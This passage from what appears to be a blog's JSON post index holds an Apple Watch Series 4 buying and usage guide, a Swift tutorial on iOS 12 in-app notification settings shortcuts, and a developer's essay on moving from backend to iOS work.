seamless integration and data synchronization between iPhone and MacOS, simplifying many tasks) Battery Life, Portability, Retina Display Why do you want to buy an Apple Watch? Record exercise activity and heart rate status Running Without Bringing Your Phone Reduce phone usage time without missing important information When carrying many bags, you can avoid taking out your phone or using Apple Pay. Approach to Auto Unlock MacBook (My MacBook Pro is the non-Touch Bar version, typing the password is exhausting) Riding a bike while using navigation Cool! Never used it before, want to buy it to try out. Want to write a WatchOS APP Start Selecting‚Ä¶Considering the factors above, start choosing the right Apple Watch; excluding the band material, there are three versions of the watch body to choose from: Aluminum metal case + potentially scratchable glass surface + GPS = $12,900 (40mm) / $13,900 (44mm) Aluminum metal case + potentially scratch-prone glass surface + GPS + cellular network = $16,500 (40mm) / $17,500 (44mm) Stainless steel case + sapphire crystal glass + GPS + cellular network = $22,900 (40mm) / $24,900 (44mm) I personally bought 2. Aluminum case + potentially scratchable glass surface + GPS + Cellular 44 mmWatch Face:SizeThere are two sizes: 40mm and 44mm. Choose based on your wrist size. Too large may feel uncomfortable and cause inaccurate heart rate detection; too small may look odd when worn.Left 44mm / Right 40mm (Thanks to colleagues for their kind support)If you can‚Äôt find something to compare at the moment, you can use a daily disposable contact lens case as a reference, approximately 44mm (actually measured 44.5mm).Here is a photo of my wrist for reference. If you‚Äôre still unsure about the size, it‚Äôs best to visit the 101 store and try it on in person (I initially aimed for the 40mm, but after trying it on, I found it was too small‚Ä¶).Apple Watch 3 38mm and Apple Watch 4 40mm are the same size; bands are interchangeable****Apple Watch 3 42mm and Apple Watch 4 44mm are the same size; bands are interchangeableCase MaterialThere are two options: aluminum metal case with a glass surface that can be scratched, and stainless steel case with a sapphire hard glass. For those with a sufficient budget, the latter is definitely recommended; personally, I had to choose the former due to budget constraints. Why choose the stainless steel case with sapphire hard glass version? Although the body is heavier (which may be noticeable during exercise), it is easier to match with outfits in daily life. Leather or metal straps paired with the unpolished body create a consistent and stylish look with business attire; switching to a sport strap during casual or exercise times still maintains elegance, balancing activity and calmness! Sapphire crystal glass is tough, so you don‚Äôt have to worry about scratches on the watch face. (Personal experience: My previous iPhone 6 was used without a case for over a year; I didn‚Äôt treat it specially, just kept it in my pocket or on the table daily. The screen got scratched badly, but the lens area with sapphire crystal glass remained intact.) But I bought the regular version‚Ä¶ If you search online for articles about Apple Watch screen protectors, you‚Äôll find two camps: one supports using protectors because they believe the screen will scratch; the other opposes it, saying it‚Äôs a matter of usage habits, the screen isn‚Äôt that fragile, and do you see Rolex watches with screen protectors?Or you might be a laid-back user who buys it to use it as is, treating it as a consumable product, so there‚Äôs no such concern.I have a bit of OCD and get annoyed by scratches, so I support using screen protectors; is it a matter of usage habits? I think only impacts count as bad usage habits‚Äîdaily dust damage is really hard to avoid.If you want to apply a screen protector, here‚Äôs a tip: ‚ÄúSpend a bit more money and have someone else do it.‚Äù I usually apply screen protectors on my own phones, so why do I recommend getting someone to do it for the Apple Watch?This part really drained me. First, I bought a tempered glass screen protector for Tokyo use from Pchome ($399). It‚Äôs a hard film with glue only on the edges. After applying, the middle was hollow and didn‚Äôt fit well, making the touch extremely unresponsive (I seriously doubt if the manufacturer ever tested it). So I removed it shortly after applying;The second attempt was buying g*r soft film ($100 for two pieces). It adheres fully with glue, but being soft makes it hard to apply and prone to bubbles; after trying both pieces, there were still some visible bubbles, which were annoying. Additionally, it is not oil- or water-repellent, making it less smooth to use.Finally spent $990 to get the X Hao Screen Protector applied (X Hao Protective Film). The H*A jelly gel glass protector fits perfectly, bubble-free, full coverage, and is oil- and water-repellent.If you still want to try applying a screen protector yourself, you can look for hydrogel film.The feel after applying the screen protector is naturally not as good as the original (personally about 97 out of 100), and the screen will be slightly raised. It‚Äôs up to personal preference! The stainless steel case is more resistant to impacts and scratches and can be polished again. I saw a colleague‚Äôs stainless steel version still in perfect condition without any scratches; I don‚Äôt care much about the case, but if you really do, maybe you can apply a protective film (?Stainless Steel Version (Thanks to colleagues for their kind support)So for those with a sufficient budget, it is still recommended to upgrade to the stainless steel version.About Choosing a Protective Case:Screen protectors easily chip at the edges. Without a case, I usually get edge damage within a month for unknown reasons. Each costs $990‚Ä¶ I‚Äôve replaced three already, which is frustrating. Since using a case, it‚Äôs been 4 months and the protector is still intact! It is recommended to use at least a protective case with a border; any brand is fine. My hard-learned lesson can be summed up in one phrase: I wish I had known sooner. If I had known about condoms earlier, I wouldn‚Äôt have wasted extra money!Should You Buy the Version That Supports Mobile Networks?I am somewhat hesitant about this; I personally bought the cellular version so I don‚Äôt have to carry my phone while running. Also, since I plan to wear it for 2‚Äì3 years and am unsure about the future, I decided to upgrade. However, if your budget is tight and you always bring your phone when going out, the WiFi version is fine (price difference is $3600).Please consider the following points: Currently, Spotify does not support offline playback, so you still need to bring your phone to listen to music while exercising (2018/11/21)p.s. Apple Music/KKBOX support offline playback, so they don‚Äôt have this issue Apple Watch apps are limited, and what you can do is mainly make calls, reply to messages, reply to Line, reply to Fb Messenger, and use Apple Pay, that‚Äôs all.*Apple Pay can be used offline without a cellular version. Mobile network usage requires an additional application and a monthly telecom fee of $199 (Chunghwa/~$149 promotional price for applications before 2018/12/31). Data usage is deducted from the original phone plan. Mobile network works by the watch sending data through the carrier to the phone, which then sends it out. Therefore, your phone must be turned on to use the watch.If the phone is off or out of battery, the watch cannot be used, even if it has mobile network service. [Updated on 2020‚Äì10‚Äì24]: Spotify now supports standalone playback. In the watch‚Äôs Spotify app, select Playback Device -&gt; Apple Watch -&gt; connect Bluetooth headphones -&gt; then you can play! (Offline downloads are still not supported; an internet connection is required).PurchaseLast week (2018/11/11), I went to 101 but couldn‚Äôt find the product I wanted. So, I ordered online from mainland China. Ordered on 11/11, shipped on 11/12, and delivered on time on 11/15:UnboxingI was so excited when I got it that I opened it right away without taking any notes. For the unboxing, you can refer to online videos: Apple Watch Series 4 Experience Full-screen Watch, Is It You? Ôºü (Mainland China), Apple Watch Series 4 Complete Unboxing! Three Features Are Amazing Feeling (Taiwan)Here is an unboxing photo.The acquisition section ends here‚Ä¶.Getting StartedPairing and basic setup will not be repeated here; please refer to the unboxing article above. This assumes you have already set everything up and are ready to use the Apple Watch.Attached is a button image ‚Äî Apple Official Support Center‚ÄúDigital Crown‚Äù = ‚ÄúDigital Crown‚Äù‚ÄúSide Button‚Äù = ‚ÄúSide Button‚ÄùButton Operation Section: Tap the digital crown to switch between the main screen and the watch face. Double-click the digital crown to switch to the most recently opened app. Tap the side button to bring up the Dock (multitasking window). You can set it to show recently opened apps or your preferred apps (open the ‚ÄúWatch‚Äù app on your iPhone -&gt; ‚ÄúMy Watch‚Äù tab -&gt; Dock -&gt; Dock order). Double-click the side button to bring up Apple Pay, and the payment will be made immediately via contactless. p.s. To change the default card for Apple Pay, open the ‚ÄúWatch‚Äù app on your iPhone -&gt; ‚ÄúMy Watch‚Äù tab -&gt; Wallet &amp; Apple Pay -&gt; Transaction Defaults -&gt; Default Card -&gt; Select the card you want as default. You cannot reorder cards; you can only set one card as the default to appear first. Long press the side button to bring up the system menu for ‚ÄúPower Off‚Äù or ‚ÄúPower On,‚Äù display the medical card, or make an SOS emergency call. Apple Watch Screenshot FeatureVery important, so it‚Äôs placed first: How to take a screenshot on Apple Watch:Open the ‚ÄúWatch‚Äù app on your iPhone -&gt; ‚ÄúMy Watch‚Äù tab -&gt; go to ‚ÄúGeneral‚Äù -&gt; turn on ‚ÄúEnable Screenshots‚ÄùPress the Digital Crown and the side button on your Apple Watch at the same time. When the screen shows a flash effect, the screenshot is taken; you can then open your iPhone to see the screenshot photo!SpeakerThe watch‚Äôs built-in speaker can only be used for calls and playing alert sounds; it cannot play music. If you feel uncomfortable talking on the watch because everyone can hear you, you can use Bluetooth earphones.Explanation of Each Icon StatusPlease refer to the official documentationConnection Between Apple Watch and iPhoneUse Bluetooth when the watch is near the phone; switch to WiFi when the distance is too far.The left side indicates a disconnected state, while the right side indicates a connected state.Sending iPhone APP Notifications to Apple WatchThe watch by default follows the notification settings of apps on the iPhone. You can also specifically disable notifications from certain apps to prevent them from being sent to the watch (open the ‚ÄúWatch‚Äù app on the iPhone -&gt; ‚ÄúMy Watch‚Äù tab -&gt; ‚ÄúNotifications‚Äù -&gt; scroll to the bottom to adjust settings for each app). If the app does not appear in this list, it means the app‚Äôs notifications are not enabled on the iPhone (please go to ‚ÄúSettings‚Äù -&gt; ‚ÄúNotifications‚Äù on your iPhone and enable notifications for the app). Why do some notifications have sound/vibration while others do not?This setting depends on the app‚Äôs notification settings on the iPhone. If the app‚Äôs ‚ÄúNotifications‚Äù has ‚ÄúSounds‚Äù enabled, it will have sound and vibration alerts. Most app notifications only support viewing, while some allow actions (e.g., Line notifications can be tapped to reply on the watch). When the phone is unused and the watch is worn, the watch will alert new notifications; the phone will not ring but notifications will still appear in the notification center. This prevents both the phone and watch from ringing at the same time. When the APP Supports Apple Watch By default, when installing an app that supports Apple Watch, the app will also be installed on the Apple Watch (you can disable this in the iPhone‚Äôs ‚ÄúWatch‚Äù app -&gt; ‚ÄúMy Watch‚Äù tab -&gt; ‚ÄúGeneral‚Äù -&gt; turn off ‚ÄúAutomatic App Install‚Äù). Can I install only the Apple Watch app?No, currently the Apple Watch app cannot be installed independently; there must be a corresponding app on the iPhone. Do not want to install the Apple Watch version of the appGo to the ‚ÄúWatch‚Äù app on your iPhone -&gt; ‚ÄúMy Watch‚Äù tab -&gt; scroll down to the ‚ÄúInstalled on Apple Watch‚Äù section -&gt; tap it -&gt; turn off ‚ÄúShow App on Apple Watch‚Äù App supporting ‚Äúcomplex features‚Äù means supporting watch face complications Watch Face DesignPut whatever you want wherever you want. Which information is important or how to design it nicely is up to you; I put ‚Äúthe information I want to see anytime I look at my watch‚Äù on the watch face. You can also add multiple faces to switch between.FlashlightYou read that right, the Apple Watch also has a flashlight; swipe up from the bottom of the watch face to open the menu and find the ‚ÄúFlashlight‚Äù icon button. Once inside, you can swipe left or right to change the screen color; yes, it‚Äôs just a bright screen color!A special feature is the Burst Flash mode:Make Nighttime Activities Safer!Different Modes‚ÄúSilent Mode‚Äù - All notifications are muted, no vibrations, no screen lighting up, only shown in the notification center‚ÄúCinema Mode‚Äù - Raising your hand won‚Äôt wake the screen; you need to tap the screen to wake it up.‚ÄúWater Lock‚Äù - Screen touch is locked and can only be unlocked by turning the digital crown. After unlocking, the speaker will automatically play a sound to expel water.„ÄåAirplane Mode„Äç - Turn off all external connections‚ÄúPower Saving Mode‚Äù - Really saves power! Only the digital crown press to display the time works; everything else is completely off, almost like being powered off. To exit power saving mode, press and hold the side button (same as powering on).In all the above modes, the alarm and countdown functions will still sound as usual. ‚ÄúPower-saving mode will force the device to turn on.‚ÄùRaise your wrist to directly call SiriSimply raise your wrist, and once the screen lights up, you can speak directly to use Siri without saying ‚ÄúHey! Siri‚Äù (e.g., after raising your wrist, just say ‚ÄúWhat‚Äôs the weather tomorrow?‚Äù).You can also use Siri when your phone is a bit away from you (e.g., while hanging clothes).AQI air quality cannot be displayed?The built-in AQI does not seem to support Taiwan. You need to search for ‚ÄúÂú®ÊÑèÁ©∫Ê∞£‚Äù in the App Store, download and open it, then go to the watch face‚Äôs complex function settings and select ‚ÄúÂú®ÊÑèÁ©∫Ê∞£‚Äù.Unlock Mac with Apple Watch Confirm that your iPhone/Apple Watch/Mac is signed in with the same Apple ID Make sure your Apple account has Two-Factor Authentication enabled. After the system detects that your Apple account has an Apple Watch device, it will add a new line in ‚ÄúSystem Preferences‚Äù -&gt; ‚ÄúSecurity &amp; Privacy‚Äù -&gt; ‚ÄúGeneral‚Äù -&gt; ‚ÄúAllow Apple Watch to unlock your Mac‚Äù -&gt; just check the box. If activation keeps failing, please first check that your Apple account has Two-Factor Authentication enabled (not Two-Step Verification) or try restarting your computer!p.s My company‚Äôs Mac Mini cannot be activated, but it works fine after a restart.Photo opens blank?By default, favorites are shown on the iPhone. Open the iPhone‚Äôs ‚ÄúPhotos‚Äù app and tap the ‚Äúheart‚Äù on the photo you want to send to your watch, and it will appear.Activity Records and Physical TrainingActivity records have three circles and three goals daily: Stand (Blue): Standing for 1 minute each hour counts as one completion. Exercise (Green): Only activities exceeding the intensity of brisk walking will be counted Activity (Red): Burned active calories, increases whenever you move For detailed information, please refer to the ‚ÄúHealth‚Äù app on your iPhone.Daily achievement notifications will appear. Additionally, you can press firmly on the ‚ÄúActivity‚Äù app on your Apple Watch to adjust the activity goal (the default is 360 active calories per day).For physical training, I use Nike Run Club for running instead of the built-in app. Last week, I tried the built-in fitness training for cycling -&gt; ‚ÄúOutdoor Cycling‚Äù to record my ride. It tracks elevation, distance, time, route, and heart rate. Awesome!Map Feature?Currently, only Apple Maps is supported; Google Maps is not supported yet. Open ‚ÄúMaps‚Äù to search or select the company or home address from personal info settings (source: Contact Info -&gt; My Card), contact info, or manually enter a destination. After starting navigation, each turn is shown as a card that automatically flips based on driving. You can rotate to view or tap to see the map details. When 40 meters remain, it will vibrate to alert you. Press firmly to end navigation.This part simply transfers your phone‚Äôs Apple Map information to the watch (the phone‚Äôs navigation will also automatically open when navigating on the watch).User Experience: Apple Maps has few landmarks, making it hard to search. It seems to only guide you on main roads, ignoring dual-lane, faster, and uncongested routes. So, I still look forward to Google Maps updates. For now, I‚Äôll just make do with this.Here is a Siri Shortcut: Open Google Map item using Apple MapBluetooth Camera ButtonWhen you open the ‚ÄúCamera‚Äù on Apple Watch, the phone‚Äôs camera also turns on, allowing you to control the phone‚Äôs camera for taking photos and videos. Press firmly to switch lenses or adjust camera settings.Where is my phone?On the watch face, swipe up from the bottom to open the menu and find the ‚Äúphone vibrating icon.‚Äù Tap it to make your phone emit a sound! Phone still makes sounds in silent or Do Not Disturb mode Pressing the icon hard will cause the phone to emit a sound as well as flash the flashlight. p.s If you want to find your watch using your phone, this feature is not available. If lost, please use the ‚ÄúFind iPhone‚Äù app to locate it.Message input cannot recognize handwritten Chinese characters, and voice input does not understand Chinese eitherI think this is a bug‚Ä¶Press and hold the ‚ÄúMicrophone‚Äù or ‚ÄúHandwriting‚Äù icon in the message to bring up the menu &gt; ‚ÄúSelect Language‚Äù -&gt; ‚ÄúChinese‚ÄùAnother method is to open ‚ÄúiPhone‚Äù -&gt; ‚ÄúSettings‚Äù -&gt; ‚ÄúGeneral‚Äù -&gt; ‚ÄúKeyboard‚Äù -&gt; ‚ÄúDictation‚Äù -&gt; ‚ÄúDictation Languages‚Äù -&gt; check only ‚ÄúMandarin‚Äù.This way, your voice input will only understand Mandarin, and the phone‚Äôs functionality will also be affected.Turn Off Deep Breathing Reminders / Turn Off Stand RemindersOpen the ‚ÄúWatch‚Äù app on your iPhone -&gt; ‚ÄúMy Watch‚Äù tab -&gt; Breathe -&gt; Turn off Breathe RemindersOpen the ‚ÄúWatch‚Äù app on your iPhone -&gt; ‚ÄúMy Watch‚Äù tab -&gt; Activity -&gt; Turn off Stand RemindersWant to set a more complex password on the watchOpen the ‚ÄúWatch‚Äù app on your iPhone -&gt; ‚ÄúMy Watch‚Äù tab -&gt; Passcode -&gt; Simple Passcode -&gt; Turn off -&gt; Then you can set a 6-digit passcodeCan the watch display Whoscall information for incoming calls?No.Does it lag?Compared to a colleague‚Äôs Apple Watch S3, the S4 launches apps almost instantly without loading and boots up very quickly.You can check the actual test in this video: „ÄêÊúÄÊñ∞„Äë4‰ª£ Apple Watch Series 4 ÈÄüÂ∫¶ÂØ¶Ê∏¨ Èü≥ÈáèÊØîËºÉDoes it consume a lot of power?My wearing time is only from getting up until before showering. I don‚Äôt wear it to bed (afraid of hitting the wall unconsciously since the bed is against the wall). I take it off before showering to charge. Fully charged at midnight and disconnected, by 8 AM the next morning about 95% remains. Fully charged and disconnected at midnight, switch to airplane mode, about 98% remains by 8 AM the next day. Worn for about 15 hours a day, if not used intensively, it still has around 65% battery left. It lasts well and can barely make it through two days on a single charge. The first charge may take longer Battery performance might not be optimal in the first few days, causing higher power consumptionUseful App Recommendations AirCare (Free): Supports watch face complications with AQI information 1SecMoney ($60): A fast bookkeeping app that supports complications on the watch face. I have tried this and CMoney, but CMoney costs $120 and has a too complicated interface, which I found hard to use personally; therefore, I recommend this one. Bus+ (Free): Check bus information. Originally used Taipei Bus, but that app does not support Apple Watch, so I had to give it up. Bus+ has a different logic from Taipei Bus; it is station-based. My personal setup is to separate frequently used locations (home/office/MRT station) and then add the bus routes passing through them. Bus+ Nike+ Run Club (Free): Running tracking app Shazam (Free): Tap to identify music (though you can also ask Siri directly). There‚Äôs another app called SoundHound, but in my experience, Shazam is faster. Taipei and New Taipei City Ubike+ (Free): Check the number of available bikes and parking spots at nearby or favorite Ubike stations Voice Recorder (Free): Quickly record audio with Apple Watch and transfer it to your phone Countdown Days (Free): View countdowns for anniversaries/future events Advanced Calculator For Apple Watch OS (Free): Use a mini calculator on Apple Watch Line, Spotify‚Ä¶.e.t.cSummary and One-Week Usage ExperienceWorn for almost two weeks now, the initial novelty has faded and it has quietly integrated into daily life. So far, the benefits felt in daily life include: unlocking my Mac without typing long passwords (company policy requires logging out when leaving the desk), checking the weather instantly, viewing navigation, receiving app notifications, and monitoring heart rate for health awareness. That‚Äôs about it. The supported apps and functions are really too limited.Has your phone usage decreased? Not really, because when I get notifications, I still prefer to respond on my phone. Replying on the watch requires voice input‚Ä¶ which is awkward in public. Writing by hand is also very slow. Moreover, many apps do not support Apple Watch.Starting at a hefty $12,900, is it really worth it? There are many great watches over ten thousand, but only one that fully integrates with the Apple ecosystem. If you just want a luxury watch, there‚Äôs no need to choose the Apple Watch. If you want a watch that can handle daily tasks, it‚Äôs worth considering. If you want a luxury item that also manages daily tasks, consider the stainless steel or even the Herm√®s edition!Since purchasing, I have thought about returning it. I always feel that $17,500 could be used for many things, and spending it on a watch doesn‚Äôt seem very worthwhile. However, it does help in daily life. Is that help worth $17,500? I don‚Äôt think so at the moment. I‚Äôll reassess when the Apple Watch app ecosystem becomes more mature. For now, it‚Äôs a luxury item XD, bought because it‚Äôs fun, trendy, and impulsive.Other items are left for everyone to experience on their own.-[Latest] Apple Watch Series 6 Unboxing &amp; Two-Year Usage Experience¬†¬ª&gt; Click HereYou‚Äôve already bought the watch, why not consider the AirPods 2 earbuds?Please see the next article¬†¬ª AirPods 2 Unboxing and Hands-on ExperienceDevelop Your Own Apple Watch App:Please see Build an Apple Watch App! (Swift)Want to Control Smart Home Devices with Your Watch?Please see Smart Home First Experience ‚Äî Apple HomeKit &amp; Xiaomi MijiaThoughts After Using for Three Months:For details, please see this article. Full-screen sticker got damaged after bumping into something while doing housework, replaced it once (bleeding) Purchased an additional leather watch strap:nomad Apple Watch strapIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS ‚â• 12ÔΩúEnable Quick Access to App Notification Settings in User Settings with Swift", "url": "/posts/zrealm-dev/ios-12-enable-quick-access-to-app-notification-settings-in-user-settings-with-swift-f644db1bb8bf/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, ios, swift, push-notification, ios-12", "date": "2018-11-12 22:38:42 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Adding an ‚ÄúAPP Notification Settings Page‚Äù Shortcut in User ‚ÄúSettings‚Äù for iOS...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Adding an ‚ÄúAPP Notification Settings Page‚Äù Shortcut in User ‚ÄúSettings‚Äù for iOS ‚â• 12 (Swift)Besides turning off notifications from the system, users have other options.Following the previous three articles: iOS ‚â• 10 Notification Service Extension Application (Swift) What? iOS 12 Can Send Push Notifications Without User Permission (Swift) iOS 9 to iOS 12 Push Notification Permission Status Handling (Swift) Let‚Äôs continue improving push notifications by experimenting with both existing technologies and newly available features!What is this time?iOS ‚â• 12 allows you to add a shortcut to your app‚Äôs notification settings page within the user‚Äôs ‚ÄúSettings,‚Äù giving users another option when they want to adjust notifications; they can jump to ‚Äúwithin the app‚Äù instead of turning them off directly from the ‚Äúsystem side.‚Äù Here‚Äôs a quick example:‚ÄúSettings‚Äù -&gt; ‚ÄúApps‚Äù -&gt; ‚ÄúNotifications‚Äù -&gt; ‚ÄúSet within the app‚ÄùAdditionally, when users receive a notification, if they want to use 3D Touch to adjust the setting to ‚ÄúTurn Off‚Äù notifications, there will be an extra option called ‚ÄúSettings in App‚Äù for users to choose.‚ÄúNotifications‚Äù -&gt; ‚Äú3D Touch‚Äù -&gt; ‚Äú‚Ä¶‚Äù -&gt; ‚ÄúTurn Off‚Ä¶‚Äù -&gt; ‚ÄúSet in App‚ÄùHow to Implement?This part of the implementation is very simple. The first step is to request an additional .providesAppNotificationSettings permission when asking for push notification authorization.//appDelegate.swift didFinishLaunchingWithOptions or....if #available(iOS 12.0, *) { let center = UNUserNotificationCenter.current() let permissiones:UNAuthorizationOptions = [.badge, .alert, .sound, .provisional,.providesAppNotificationSettings] center.requestAuthorization(options: permissiones) { (granted, error) in }}After asking the user whether to allow notifications, if notifications are enabled, options will appear below (regardless of whether the user previously allowed or denied).Step 2:The second and final step; we need to make appDelegate conform to the UNUserNotificationCenterDelegate protocol and implement the userNotificationCenter(_ center: UNUserNotificationCenter, openSettingsFor notification: UNNotification?) method!//appDelegate.swiftimport UserNotifications@UIApplicationMainclass AppDelegate: UIResponder, UIApplicationDelegate { var window: UIWindow? func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool { if #available(iOS 10.0, *) { UNUserNotificationCenter.current().delegate = self } return true } //Other parts omitted...}extension AppDelegate: UNUserNotificationCenterDelegate { @available(iOS 10.0, *) func userNotificationCenter(_ center: UNUserNotificationCenter, openSettingsFor notification: UNNotification?) { //Navigate to your settings page location.. //EX: //let VC = SettingViewController(); //self.window?.rootViewController.present(alertController, animated: true) }} Implement delegate in AppDelegate‚Äôs didFinishLaunchingWithOptions AppDelegate conforms to the delegate and implements the methods Done! Compared to the previous articles, implementing this feature is much simpler üèÜSummaryThis feature is somewhat similar to the one mentioned in the previous article where silent push notifications with lower interference are sent to users without requiring their authorization to test the waters!They all build new bridges between developers and users. In the past, when apps were too noisy, we would go straight to the settings page and mercilessly turn off all notifications. However, this means that for developers, whether the notifications are good, bad, or useful, none can be sent to users anymore. Users might also miss important messages or limited-time offers because of this.This feature allows users to choose to open the app to adjust notifications when they want to disable them. Developers can categorize push notification items, letting users decide which types of notifications they want to receive.For the ÁµêÂ©öÂêßAPP, users who find column notifications too intrusive can turn them off individually; however, they will still receive important system notifications. p.s The ability to individually disable notifications is a feature already available in our app, but combining it with iOS ‚â•12‚Äôs new notification features can provide better effects and an improved user experienceIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS App DevelopmentÔΩúIgnite Passion for Continuous Tech Exploration", "url": "/posts/zrealm-life/ios-app-development-ignite-passion-for-continuous-tech-exploration-8d863bcd1c55/", "categories": "ZRealm Life.", "tags": "english, ai-translation, ios-app-development, back-end-development, life-lessons, lifestyle, medium", "date": "2018-11-04 02:54:07 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Always Keep the Passion for Exploring New ThingsFrom Entering the IT Field to ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Always Keep the Passion for Exploring New ThingsFrom Entering the IT Field to Transitioning into iOS App Development: A Life OpportunityBangkok 2018 - Z Realm ‚Äî You Are Not Alone on the Road to Solving ProblemsTime flies. It has been a full year since I switched from Back End to Mobile iOS APP development, and a full month since I started writing on Medium. For my 10th small milestone post, let me share my personal breakthrough and career transition experience.Always Keep the Passion for Exploring New Things‚ÄúThe instinct to explore drives humanity‚Äôs greatest achievements.‚Äù From Columbus discovering new continents by exploring the seas, the Wright brothers improving airplanes to conquer the skies, to now leaving Earth to explore outer space; only a passion for new things can continuously push us beyond ourselves. We may not be as great as Armstrong, but as he said, ‚ÄúYour small step may be a giant leap for mankind.‚Äù Never underestimate your creative potential.OpportunityWhen opportunity comes, grasp it well, because there may not be a second chance; you might hesitate, thinking the next one could be better or fear making the wrong decision, but ‚ÄúWho know s? Does the sun rise first or does the accident come first.‚Äù If there is no negative impact, then open your arms and seize the opportunity!Back in 2009, when I just entered the first year of Chang Gong Comprehensive High School, I accidentally found out that the school was training students to compete in contests. At that time, I thought, ‚ÄúSince I have nothing to do at home, I might as well learn something,‚Äù so I signed up. This was the first turning point in my life and marked my entry into the IT field. Joining the training was tough‚Äîevery day after class, weekends, and during winter and summer vacations for three years, I practiced at school. The risk was high because if I didn‚Äôt win any awards, I would gain almost nothing. But in the end, I‚Äôm glad I seized that opportunity (I will share more about the emotional journey of being a competitor later).National Skills Competition - Workforce Development Agency, Ministry of LaborThis opportunity taught me many skills related to dining, design tools like Illustrator/Photoshop/Flash, and engineering languages such as PHP/MySQL/HTML/CSS/Javascript/JQuery. I also earned a championship that granted me admission to Taiwan Tech University. Looking back, I‚Äôm really glad I seized this chance!Fast forward to 2017, I graduated from university and entered the workforce as a backend engineer. Regarding web development, I mainly specialized in backend (Laravel) during university. I didn‚Äôt focus much on frontend and mostly used ready-made frameworks (Bootstrap/Semantic UI).At this point, the bottleneck was staying too long in the same field without any breakthrough development, so I set a new goal for myself: Continue Exploring the Backend Further Conversion Marketing (GA) / Planning Field Learning a New Language / Writing an App At this point, an opportunity arose as the project I joined was about to start developing a mobile platform app. Initially, I planned to write the API backend using Laravel and some new technologies, which was also a breakthrough for me. Here, I want to mention an important point: when making decisions, you need to look ahead. The reason I initially chose to continue with backend development was due to laziness and the high entry cost‚ÄîI didn‚Äôt have a Mac at the time, and it was a completely new field for me. Fortunately, my supervisor‚Äôs advice helped, and I ultimately chose to step into iOS app development.As of 2018, it has been exactly one year since I started developing iOS apps. What I gained: learning a new language Swift, iOS app development, the satisfaction of publishing my own app, and starting to write on Medium. Fortunately, I seized this opportunity, which opened another door for my career!Reflections on Transitioning from Backend Engineering to iOS App Development‚ÄúIsn‚Äôt programming all the same?‚Äù Different fields are like different worlds‚Ä¶Having someone guide you at the beginning helps because many concepts differ from web development. You‚Äôll face a period of frustration, but if you persevere, you‚Äôll see the light of success!I myself struggled for almost a month. After getting some clarity, you‚Äôll encounter a second wall. At this point, you need to be more resilient, learn from mistakes, and trade time for experience (if you lack time, consider taking an introductory course or finding a mentor). Development Environment: Previously, when writing PHP, we used Sublime, typed away, pressed Ctrl+S, then Ctrl+Tab to switch to the browser and Ctrl+R to quickly see the results. Now, with Xcode, we need to deploy to the simulator or device to see the results. This actually helps improve my impatient nature XD. Language: Swift is more modern, strongly typed, and structured. It may feel unfamiliar at first, but once you get used to it, it‚Äôs no problem. Storyboard/Interface Builder: This part lowers the entry barrier for beginners. Starting with coding the interface can be more difficult; you can directly visualize the UI, learn layout, and connect Outlets. Memory and Page Layout Structure: This is a key area to pay attention to and where experience gained over time matters; in the past, web development had almost no limits‚Äîyou could do whatever you wanted. For example, with tables, on the web you just use &lt;table&gt; and run a PHP loop to display data. But in an app, you need to use the UITableView component to implement it (I once used UIView to layout and happily told my manager I was done, only to find a huge memory explosion).You also need to be very careful about memory leaks! App Launch: APP development requires more caution, and testing must be more thorough. Unlike websites, where errors can be fixed immediately, iOS APP versions must pass review. Bugs cannot be fixed by downgrading, so fixing a bug takes at least a day, greatly affecting users! User Reviews: Users can give you the most direct feedback Five Stars for Warmth, One Heart for HeartacheSummary@returntothesourcesLife is interesting because it is full of uncertainties. When opportunities come, if you choose to seize them, you will gain something; if you choose to let go, the next chance may be better. There is no right or wrong‚Äîjust trust your intuition: ‚ÄúChoose what you love, love what you choose.‚ÄùExpectations for MyselfI‚Äôm still a beginner and will continue working on iOS app development, aiming to learn, grow, and find breakthroughs. I also plan to keep writing on Medium. What‚Äôs the next opportunity? I‚Äôm looking forward to it!If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Notification Permission HandlingÔΩúSwift Solutions for iOS 9 to iOS 12", "url": "/posts/zrealm-dev/ios-notification-permission-handling-swift-solutions-for-ios-9-to-ios-12-fd7f92d52baa/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, push-notification, observables, ios-app-development, swift", "date": "2018-11-02 23:23:44 +0800", "snippet": " 